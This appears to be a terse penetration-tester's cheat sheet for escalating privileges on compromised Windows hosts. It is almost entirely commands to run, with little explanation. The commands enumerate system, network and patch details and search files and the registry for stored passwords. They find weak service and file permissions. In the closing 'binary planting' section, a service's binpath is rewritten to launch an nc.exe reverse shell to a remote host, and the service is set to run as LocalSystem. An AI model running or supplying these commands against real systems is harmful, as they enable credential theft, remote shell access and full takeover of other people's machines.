# windows priv escalation

Ref: 

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
* [https://www.youtube.com/watch?v=kMG8IsCohHA](https://www.youtube.com/watch?v=kMG8IsCohHA)
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
* [http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx)



* What system are we connected to? 
  * systeminfo \| findstr /B /C:"OS Name" /C:"OS Version"
* Get the hostname and username \(if available\) 
  * hostname 
  * echo %username%
* Get users 
  * net users 
  * net user \[username\]
* Networking stuff 
  * ipconfig /all
* Printer? 
  * route print
* ARP-arific 
  * arp -A
* Active network connections 
  * netstat -ano
* Firewall fun \(Win XP SP2+ only\) 
  * netsh firewall show state 
  * netsh firewall show config
* Scheduled tasks 
  * schtasks /query /fo LIST /v
* Running processes to started services 
  * tasklist /SVC 
  * net start
* Driver madness 
  * DRIVERQUERY
* WMIC fun \(Win 7/8 -- XP requires admin\) 
  * `wmic /?`
  * `#Use wmic_info script!`
* WMIC: check patch level 
  * wmic qfe get Caption,Description,HotFixID,InstalledOn
* Search pathces for given patch 
  * wmic qfe get Caption,Description,HotFixID,InstalledOn \| findstr /C:"KB.." /C:"KB.."
* AlwaysInstallElevated fun 
  * reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
  * reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
* Other commands to run to hopefully get what we need 
  * dir /s _pass_ == _cred_ == _vnc_ == _.config_ 
  * findstr /si password _.xml_ .ini \*.txt 
  * reg query HKLM /f password /t REG\_SZ /s 
  * reg query HKCU /f password /t REG\_SZ /s
* Service permissions 
  * sc query 
  * sc qc \[service\_name\]
* Accesschk stuff 
  * accesschk.exe /accepteula \(always do this first!!!!!\) 
  * accesschk.exe -ucqv \[service\_name\] \(requires sysinternals accesschk!\) 
  * accesschk.exe -uwcqv "Authenticated Users" \* \(won't yield anything on Win 8\) 
  * accesschk.exe -ucqv \[service\_name\]
  * Find all weak folder permissions per drive. 
    * accesschk.exe -uwdqs Users c: 
    * accesschk.exe -uwdqs "Authenticated Users" c:\
  * Find all weak file permissions per drive. 
    * accesschk.exe -uwqs Users c:\*.\*
    * accesschk.exe -uwqs "Authenticated Users" c:\.\*
* Binary planting 
  * sc config \[service\_name\] binpath= "C:\nc.exe -nv \[RHOST\] \[RPORT\] -e C:\WINDOWS\System32\cmd.exe" 
  * sc config \[service\_name\] obj= ".\LocalSystem" password= "" 
  * sc qc \[service\_name\] \(to verify!\) 
  * net start \[service\_name\]

Ref:  [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

